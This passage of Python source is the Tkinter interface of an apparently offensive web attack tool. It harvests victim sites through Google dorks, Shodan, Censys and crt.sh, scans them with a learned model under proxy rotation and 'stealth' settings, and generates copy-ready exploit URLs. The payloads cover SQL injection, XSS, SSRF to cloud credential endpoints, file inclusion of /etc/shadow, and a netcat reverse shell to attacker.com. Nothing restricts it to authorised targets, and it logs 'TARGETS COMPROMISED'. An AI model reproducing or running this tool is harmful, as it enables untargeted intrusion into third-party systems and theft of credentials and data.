        self.exploit_text.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)
        self.exploit_text.insert(tk.END, "// Select a vulnerability to generate exploit payload...")
        
        btn_frame = tk.Frame(right_panel, bg=self.colors["bg_panel"])
        btn_frame.pack(pady=10, padx=15, fill=tk.X)
        
        self.copy_btn = tk.Button(btn_frame, text="📋 COPY PAYLOAD", bg=self.colors["highlight"], fg="white", relief=tk.FLAT, command=self.copy_exploit)
        self.copy_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        self.view_report_btn = tk.Button(btn_frame, text="📄 OPEN REPORT", bg=self.colors["highlight"], fg="white", relief=tk.FLAT, command=self.view_report, state=tk.DISABLED)
        self.view_report_btn.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(5, 0))

    def toggle_attack_selector(self):
        mode = self.scan_mode.get()
        
        # Handle Attack Selector
        if mode == "specific":
            self.attack_combo.config(state="readonly")
        else:
            self.attack_combo.config(state=tk.DISABLED)
            
        # Handle Discovery Frame
        if mode == "targetless":
            # Show header first
            self.discovery_section_header.pack(pady=(15, 5), padx=15, anchor=tk.W)
            # Then show frame
            self.discovery_frame.pack(fill=tk.X, padx=15, pady=5)
        else:
            # Hide both header and frame
            self.discovery_section_header.pack_forget()
            self.discovery_frame.pack_forget()

    def add_section_header(self, parent, text):
        tk.Label(parent, text=text, font=("Courier New", 12, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text_dim"]).pack(pady=(15, 5), padx=15, anchor=tk.W)

    def create_input_field(self, parent, label_text, variable, placeholder):
        frame = tk.Frame(parent, bg=self.colors["bg_panel"])
        frame.pack(pady=5, padx=15, fill=tk.X)
        tk.Label(frame, text=label_text, font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).pack(anchor=tk.W)
        entry = tk.Entry(frame, textvariable=variable, font=("Consolas", 10), bg="black", fg="white", relief=tk.FLAT, insertbackground="white")
        entry.pack(fill=tk.X, ipady=5)
        entry.insert(0, placeholder)
        ToolTip(entry, f"Enter the {label_text.lower().replace(':', '')} here")

    def create_slider_field(self, parent, label_text, variable, from_, to, default, tooltip_text=None):
        frame = tk.Frame(parent, bg=self.colors["bg_panel"])
        frame.pack(pady=5, padx=15, fill=tk.X)
        tk.Label(frame, text=label_text, font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).pack(anchor=tk.W)
        tk.Scale(frame, from_=from_, to=to, orient=tk.HORIZONTAL, variable=variable, bg=self.colors["bg_panel"], fg=self.colors["accent"], troughcolor="black", showvalue=True, highlightthickness=0).pack(fill=tk.X)
        variable.set(default)
        if tooltip_text:
            ToolTip(frame, tooltip_text)
        else:
            ToolTip(frame, f"Adjust {label_text.lower().replace(':', '')}")

    def create_model_selector(self, parent):
        frame = tk.Frame(parent, bg=self.colors["bg_panel"])
        frame.pack(pady=5, padx=15, fill=tk.X)
        tk.Label(frame, text="BRAIN MODEL:", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).pack(anchor=tk.W)
        
        combo_frame = tk.Frame(frame, bg=self.colors["bg_panel"])
        combo_frame.pack(fill=tk.X)
        
        self.model_combo = ttk.Combobox(combo_frame, textvariable=self.model_path, state="readonly")
        self.model_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        browse_btn = tk.Button(combo_frame, text="📂", font=("Consolas", 8), command=self.browse_model, bg=self.colors["highlight"], fg="white", relief=tk.FLAT, width=3)
        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))

    def browse_model(self):
        filename = filedialog.askopenfilename(initialdir="checkpoints", title="Select Model File", filetypes=(("PyTorch Models", "*.pth"), ("All Files", "*.*")))
        if filename:
            self.model_path.set(filename)
    
    def browse_proxy_file(self):
        filename = filedialog.askopenfilename(title="Select Proxy List File", filetypes=(("Text Files", "*.txt"), ("All Files", "*.*")))
        if filename:
            self.proxy_file.set(filename)
    
    def fetch_proxies(self):
        """Auto-fetch free proxies from the internet"""
        self.log("Fetching free proxies from the internet...", "INFO")
        
        def fetch_in_background():
            try:
                fetcher = ProxyFetcher()
                proxies = fetcher.fetch_all()
                
                if proxies:
                    filename = fetcher.save_to_file(proxies, "proxies.txt")
                    if filename:
                        self.root.after(0, lambda: self.proxy_file.set(filename))
                        self.root.after(0, lambda: self.log(f"✅ Fetched {len(proxies)} proxies and saved to {filename}", "SUCCESS"))
                    else:
                        self.root.after(0, lambda: self.log("❌ Failed to save proxies", "ERROR"))
                else:
                    self.root.after(0, lambda: self.log("❌ No proxies fetched", "ERROR"))
            except Exception as e:
                self.root.after(0, lambda: self.log(f"❌ Error fetching proxies: {e}", "ERROR"))
        
        threading.Thread(target=fetch_in_background, daemon=True).start()

    def load_available_models(self):
        models = []
        if os.path.exists("dqn_web_sec_model.pth"):
            models.append("dqn_web_sec_model.pth (Final)")
        checkpoints = glob.glob("checkpoints/dqn_checkpoint_ep*.pth") + glob.glob("checkpoints/multi_target_*.pth")
        for cp in sorted(checkpoints, reverse=True):
            models.append(cp)
        if models:
            self.model_combo['values'] = models
            self.model_combo.current(0)
        else:
            self.model_combo['values'] = ["No models found"]
            self.model_combo.current(0)

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = "[+]" if level == "SUCCESS" else "[-]" if level == "ERROR" else "[!]" if level == "WARNING" else "[*]"
        color = self.colors["accent"] if level == "SUCCESS" else self.colors["danger"] if level == "ERROR" else self.colors["warning"] if level == "WARNING" else self.colors["text_dim"]
        
        self.output_text.tag_config(level, foreground=color)
        self.output_text.insert(tk.END, f"{prefix} {timestamp} {message}\n", level)
        self.output_text.see(tk.END)

    def add_finding(self, finding):
        self.findings.append(finding)
        display_text = f"[{finding.get('type', 'Vuln')}] {finding.get('url', 'URL')}"
        self.findings_list.insert(tk.END, display_text)
        self.findings_list.see(tk.END)

    def on_finding_select(self, event):
        selection = self.findings_list.curselection()
        if not selection: return
        index = selection[0]
        finding = self.findings[index]
        
        # Extract base URL and generate full payload URLs
        vuln_url = finding.get('url', 'http://target.com')
        vuln_type = finding.get('type', '')
        
        # Generate full URL examples with payloads
        full_url_examples = self._generate_full_url_payloads(vuln_url, vuln_type)
        
        content = f"""# 🚨 VULNERABILITY DETECTED
Type: {finding.get('type')}
URL:  {finding.get('url')}
Payload: {finding.get('payload')}

# 🛠️ ATTACK VECTOR
{ExploitGenerator.get_steps(finding)}

# 💡 READY-TO-USE EXPLOIT URLS (Copy & Paste in Browser/Burp)
{full_url_examples}

# 💻 CURL EXPLOIT
{ExploitGenerator.generate_curl(finding)}

# 🐍 PYTHON EXPLOIT
{ExploitGenerator.generate_python(finding)}
"""
        self.exploit_text.delete(1.0, tk.END)
        self.exploit_text.insert(tk.END, content)
    
    def _generate_full_url_payloads(self, base_url, vuln_type):
        """Generate full URLs with payloads injected"""
        # Parse URL to inject payloads properly
        from urllib.parse import urlparse, parse_qs, urlencode
        
        parsed = urlparse(base_url)
        base_path = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        examples = []
        
        if 'SQL' in vuln_type:
            examples = [
                f"{base_path}?id=1' OR 1=1--",
                f"{base_path}?id=1' UNION SELECT username,password FROM users--",
                f"{base_path}?search=admin' --",
                f"{base_path}?id=1' AND SLEEP(5)--",
                f"{base_path}?user=admin' OR '1'='1"
            ]
        elif 'XSS' in vuln_type:
            examples = [
                f"{base_path}?q=<script>alert(1)</script>",
                f"{base_path}?search=<img src=x onerror=alert(document.cookie)>",
                f"{base_path}?name=<svg/onload=alert(1)>",
                f"{base_path}?comment=\"><script>alert(1)</script>",
                f"{base_path}?input=javascript:alert(1)"
            ]
        elif 'SSRF' in vuln_type:
            examples = [
                f"{base_path}?url=http://169.254.169.254/latest/meta-data/",
                f"{base_path}?url=http://localhost:22",
                f"{base_path}?url=file:///etc/passwd",
                f"{base_path}?redirect=http://127.0.0.1:6379",
                f"{base_path}?fetch=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            ]
        elif 'LFI' in vuln_type or 'Path' in vuln_type:
            examples = [
                f"{base_path}?file=../../../../etc/passwd",
                f"{base_path}?page=....//....//....//etc/shadow",
                f"{base_path}?include=php://filter/convert.base64-encode/resource=index.php",
                f"{base_path}?path=..\\..\\..\\..\\windows\\win.ini",
                f"{base_path}?doc=/var/log/apache2/access.log"
            ]
        elif 'Command' in vuln_type:
            examples = [
                f"{base_path}?cmd=; whoami",
                f"{base_path}?exec=| cat /etc/passwd",
                f"{base_path}?run=$(id)",
                f"{base_path}?shell=; ls -la",
                f"{base_path}?ping=127.0.0.1; nc attacker.com 4444 -e /bin/bash"
            ]
        elif 'IDOR' in vuln_type:
            examples = [
                f"{base_path}?id=1 (try id=2, id=999)",
                f"{base_path}?user_id=123 (try other IDs)",
                f"{base_path}?document=abc123",
                f"{base_path.replace('/user/', '/admin/')} (privilege escalation)"
            ]
        elif 'SSTI' in vuln_type:
            examples = [
                f"{base_path}?template={{{{7*7}}}}",
                f"{base_path}?name={{{{config}}}}",
                f"{base_path}?input={{{{''.__class__.__mro__[1].__subclasses__()}}}}",
                f"{base_path}?data=${{7*7}}"
            ]
        else:
            # Generic examples
            examples = [
                f"{base_path}?param=malicious_payload",
                f"{base_path}?id=1' OR 1=1--",
                f"{base_path}?q=<script>alert(1)</script>",
                f"{base_path}?file=../../../../etc/passwd"
            ]
        
        return "\n".join([f"- {url}" for url in examples])

    def copy_exploit(self):
        content = self.exploit_text.get(1.0, tk.END)
        self.root.clipboard_clear()
        self.root.clipboard_append(content)
        messagebox.showinfo("COPIED", "Exploit payload copied to clipboard.")

    def flash_attack(self):
        """One-Click Attack Mode"""
        self.crawl_depth.set(10)
        self.test_episodes.set(1)
        self.scan_mode.set("auto")
        self.start_scan()

    def start_scan(self):
        mode = self.scan_mode.get()
        target = self.target_url.get().strip()
        
        # Validation
        if mode != "targetless":
            if not target:
                messagebox.showerror("Error", "Please enter a target URL.")
                return
            # Only add http:// if user didn't specify any protocol
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
                self.log(f"No protocol specified, defaulting to HTTP: {target}", "INFO")
            else:
                # User specified protocol - respect their choice
                if target.startswith('https://'):
                    self.log(f"Using HTTPS as specified: {target}", "INFO")
                else:
                    self.log(f"Using HTTP as specified: {target}", "INFO")
        
        model_selection = self.model_path.get()
        if " (Final)" in model_selection:
            model = model_selection.replace(" (Final)", "")
        else:
            model = model_selection
            
        specific_attack = self.specific_attack_type.get() if mode == "specific" else None
        
        # Targetless Config
        dork = self.dork_query.get().strip()
        shodan_q = self.shodan_query.get().strip()
        shodan_k = self.shodan_key.get().strip()
        crtsh_d = self.crtsh_domain.get().strip()
        ddg_q = self.duckduckgo_query.get().strip()
        censys_q = self.censys_query.get().strip()
        censys_q = self.censys_query.get().strip()
        censys_k = self.censys_api_key.get().strip()
        
        if mode == "targetless" and not (dork or shodan_q or crtsh_d or ddg_q or censys_q):
             messagebox.showerror("Error", "Please enter at least one discovery query (Dork, Shodan, CRT.sh, etc).")
             return
        
        self.scan_button.config(state=tk.DISABLED)
        self.flash_btn.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.is_scanning = True
        self.progress.start(10)
        self.output_text.delete(1.0, tk.END)
        self.findings_list.delete(0, tk.END)
        self.findings = []
        self.exploit_text.delete(1.0, tk.END)
        self.exploit_text.insert(tk.END, "// Scanning target... Awaiting findings...")
        
        threading.Thread(target=self.run_scan, args=(target, model, mode, specific_attack, dork, shodan_q, shodan_k, crtsh_d, ddg_q, censys_q, censys_i, censys_s), daemon=True).start()

    def run_scan(self, target, model, mode, specific_attack, dork, shodan_q, shodan_k, crtsh_d, ddg_q, censys_q, censys_i, censys_s):
        # Redirect stdout to GUI
        class StdoutRedirector:
            def __init__(self, text_widget):
                self.text_widget = text_widget
            def write(self, string):
                self.text_widget.after(0, lambda: self.text_widget.insert(tk.END, string))
                self.text_widget.after(0, lambda: self.text_widget.see(tk.END))
            def flush(self):
                pass
                
        old_stdout = sys.stdout
        sys.stdout = StdoutRedirector(self.output_text)
        
        try:
            targets = []
            if mode == "targetless":
                self.log(f"🌍 INITIATING TARGET HUNTING...", "INFO")
                hunter = TargetHunter(shodan_api_key=shodan_k)
                
                if dork:
                    found = hunter.dork_google(dork, num_results=5)
                    self.log(f"🔍 Google Dork found {len(found)} targets", "SUCCESS")
                    targets.extend(found)
                    
                if shodan_q:
                    found = hunter.search_shodan(shodan_q, limit=5)
                    self.log(f"🌐 Shodan found {len(found)} targets", "SUCCESS")
                    targets.extend(found)
                
                if crtsh_d:
                    found = hunter.search_crtsh(crtsh_d)
                    self.log(f"📜 CRT.sh found {len(found)} subdomains", "SUCCESS")
                    targets.extend(found)
                    
                if ddg_q:
                    found = hunter.search_duckduckgo(ddg_q, num_results=5)
                    self.log(f"🦆 DuckDuckGo found {len(found)} targets", "SUCCESS")
                    targets.extend(found)
                    
                if censys_q:
                    found = hunter.search_censys(censys_q, censys_i, censys_s, limit=5)
                    self.log(f"👁️ Censys found {len(found)} targets", "SUCCESS")
                    targets.extend(found)
                    
                targets = list(set(targets))
                self.log(f"✅ Total unique targets found: {len(targets)}", "SUCCESS")
                
                if not targets:
                    self.log("❌ No targets found. Aborting.", "ERROR")
                    return
            else:
                targets = [target]

            self.log(f"INITIATING ATTACK SEQUENCE ON {len(targets)} TARGETS", "INFO")
            self.log(f"MODE: {mode.upper()} | MODEL: {os.path.basename(model)}", "INFO")
            
            # Load proxies if provided
            proxy_list = None
            proxy_file = self.proxy_file.get().strip()
            if proxy_file and os.path.exists(proxy_file):
                try:
                    with open(proxy_file, 'r') as f:
                        proxy_list = [line.strip() for line in f if line.strip()]
                    self.log(f"LOADED {len(proxy_list)} PROXIES", "SUCCESS")
                except Exception as e:
                    self.log(f"PROXY LOAD ERROR: {e}", "ERROR")
            
            stealth = self.stealth_level.get()
            self.log(f"STEALTH LEVEL: {stealth.upper()}", "INFO")
            
            total_findings = 0
            
            for i, current_target in enumerate(targets):
                if not self.is_scanning: break
                
                self.log(f"\n🚀 SCANNING TARGET {i+1}/{len(targets)}: {current_target}", "INFO")
                
                self.auditor = SecurityAuditor(
                    current_target, 
                    model,
                    use_proxies=bool(proxy_list),
                    proxy_list=proxy_list,
                    stealth_level=stealth
                )
                
                # Hook the log_finding callback
                original_log_finding = self.auditor.log_finding
                def gui_log_finding(finding):
                    original_log_finding(finding)
                    self.root.after(0, lambda: self.add_finding(finding))
                    self.root.after(0, lambda: self.log(f"VULNERABILITY CONFIRMED: {finding.get('type')}", "WARNING"))
                
                self.auditor.log_finding = gui_log_finding
                
                # For targetless, we force zeroday mode for the actual scan part if it was targetless
                actual_mode = "zeroday" if mode == "targetless" else mode
                
                findings = self.auditor.start_audit(
                    crawl_depth=self.crawl_depth.get(), 
                    test_intensity=self.test_episodes.get(),
                    scan_mode=actual_mode,
                    specific_attack=specific_attack
                )
                total_findings += len(findings)
            
            self.root.after(0, lambda: self.scan_complete(total_findings))
            
        except Exception as e:
            self.root.after(0, lambda: self.log(f"SYSTEM ERROR: {str(e)}", "ERROR"))
            self.root.after(0, lambda: self.stop_scan())
        finally:
            sys.stdout = old_stdout

    def scan_complete(self, count):
        self.log(f"MISSION COMPLETE. {count} TARGETS COMPROMISED.", "SUCCESS")
        self.progress.stop()
        self.scan_button.config(state=tk.NORMAL)
        self.flash_btn.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.view_report_btn.config(state=tk.NORMAL)
        self.is_scanning = False
        messagebox.showinfo("MISSION COMPLETE", f"Scan finished.\nFound {count} vulnerabilities.")

    def stop_scan(self):
        if self.auditor:
            self.auditor.stop()
        self.is_scanning = False
        self.progress.stop()
        self.scan_button.config(state=tk.NORMAL)
        self.flash_btn.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log("MISSION ABORTED BY USER", "WARNING")

    def preview_queries(self):
        """Show preview of auto-generated queries in a popup window"""
        from utils.target_hunter import TargetHunter
        import random
        
        # Create popup window
        preview_window = tk.Toplevel(self.root)
        preview_window.title("🔍 Auto-Generated Query Preview")
        preview_window.geometry("800x600")
        preview_window.configure(bg=self.colors["bg_dark"])
        
        # Header
        header = tk.Label(
            preview_window,
            text="🤖 AUTO-GENERATED QUERIES PREVIEW",
            font=("Courier New", 14, "bold"),
            bg=self.colors["bg_dark"],
            fg=self.colors["accent"]
        )
        header.pack(pady=10)
        
        # Info label
        info = tk.Label(
            preview_window,
            text="These queries will be randomly selected when you start the scan",
            font=("Consolas", 9),
            bg=self.colors["bg_dark"],
            fg=self.colors["text_dim"]
        )
        info.pack(pady=5)
        
        # Text area with scrollbar
        text_frame = tk.Frame(preview_window, bg=self.colors["bg_dark"])
        text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        scrollbar = tk.Scrollbar(text_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        text_area = tk.Text(
            text_frame,
            wrap=tk.WORD,
            font=("Consolas", 9),
            bg="black",
            fg=self.colors["text"],
            yscrollcommand=scrollbar.set
        )
        text_area.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=text_area.yview)
        
        # Get queries from TargetHunter
        hunter = TargetHunter()
        
        # Google Dorks
        text_area.insert(tk.END, "🔍 GOOGLE DORKS (60+ available)\n", "header")
        text_area.insert(tk.END, "=" * 70 + "\n\n")
        dorks = hunter.get_common_dorks()
        sample_dorks = random.sample(dorks, min(10, len(dorks)))
        for i, dork in enumerate(sample_dorks, 1):
            text_area.insert(tk.END, f"{i}. {dork}\n")
        text_area.insert(tk.END, f"\n... and {len(dorks) - 10} more dorks\n\n")
        
        # Shodan Queries
        text_area.insert(tk.END, "🌐 SHODAN QUERIES (30+ available)\n", "header")
        text_area.insert(tk.END, "=" * 70 + "\n\n")
        shodan_queries = hunter.get_shodan_queries()
        sample_shodan = random.sample(shodan_queries, min(10, len(shodan_queries)))
        for i, query in enumerate(sample_shodan, 1):
            text_area.insert(tk.END, f"{i}. {query}\n")
        text_area.insert(tk.END, f"\n... and {len(shodan_queries) - 10} more queries\n\n")
        
        # CRT.sh Domains
        text_area.insert(tk.END, "📜 CRT.SH DOMAINS (10+ available)\n", "header")
        text_area.insert(tk.END, "=" * 70 + "\n\n")
        domains = hunter.get_target_domains()
        for i, domain in enumerate(domains, 1):
            text_area.insert(tk.END, f"{i}. {domain}\n")
        text_area.insert(tk.END, "\n")
        
        # DuckDuckGo Queries
        text_area.insert(tk.END, "🦆 DUCKDUCKGO QUERIES (10+ available)\n", "header")
        text_area.insert(tk.END, "=" * 70 + "\n\n")
        ddg_queries = hunter.get_duckduckgo_queries()
        for i, query in enumerate(ddg_queries, 1):
            text_area.insert(tk.END, f"{i}. {query}\n")
        text_area.insert(tk.END, "\n")
        
        # Censys Queries
        text_area.insert(tk.END, "👁️ CENSYS QUERIES (10+ available)\n", "header")
        text_area.insert(tk.END, "=" * 70 + "\n\n")
        censys_queries = hunter.get_censys_queries()
        sample_censys = random.sample(censys_queries, min(10, len(censys_queries)))
        for i, query in enumerate(sample_censys, 1):
            text_area.insert(tk.END, f"{i}. {query}\n")
        
        # Configure tags
        text_area.tag_config("header", foreground=self.colors["accent"], font=("Courier New", 10, "bold"))
        
        # Make read-only
        text_area.config(state=tk.DISABLED)
        
        # Close button
        close_btn = tk.Button(
            preview_window,
            text="✅ GOT IT",
            font=("Courier New", 11, "bold"),
            bg=self.colors["accent"],
            fg="black",
            relief=tk.FLAT,
            cursor="hand2",
            command=preview_window.destroy,
            width=20
        )
        close_btn.pack(pady=10)

    def random_query(self, query_type):
        """Fill the field with a random query from the database"""
        from utils.target_hunter import TargetHunter
        import random
        
        hunter = TargetHunter()
        
        if query_type == "dork":
            dorks = hunter.get_common_dorks()
            self.dork_query.set(random.choice(dorks))
            self.log(f"Random Google Dork: {self.dork_query.get()}", "INFO")
            
        elif query_type == "shodan":
            queries = hunter.get_shodan_queries()
            self.shodan_query.set(random.choice(queries))
            self.log(f"Random Shodan Query: {self.shodan_query.get()}", "INFO")
            
        elif query_type == "crtsh":
            domains = hunter.get_target_domains()
            self.crtsh_domain.set(random.choice(domains))
            self.log(f"Random CRT.sh Domain: {self.crtsh_domain.get()}", "INFO")
            
        elif query_type == "duckduckgo":
            queries = hunter.get_duckduckgo_queries()
            self.duckduckgo_query.set(random.choice(queries))
            self.log(f"Random DuckDuckGo Query: {self.duckduckgo_query.get()}", "INFO")
            
        elif query_type == "censys":
            queries = hunter.get_censys_queries()
            self.censys_query.set(random.choice(queries))
            self.log(f"Random Censys Query: {self.censys_query.get()}", "INFO")



    def view_report(self):
        reports = glob.glob("reports/vulnerability_report_*.html")
        if reports:
            latest = max(reports, key=os.path.getctime)
            os.startfile(latest)

if __name__ == "__main__":
    root = tk.Tk()
    app = SecurityScannerGUI(root)
    root.mainloop()
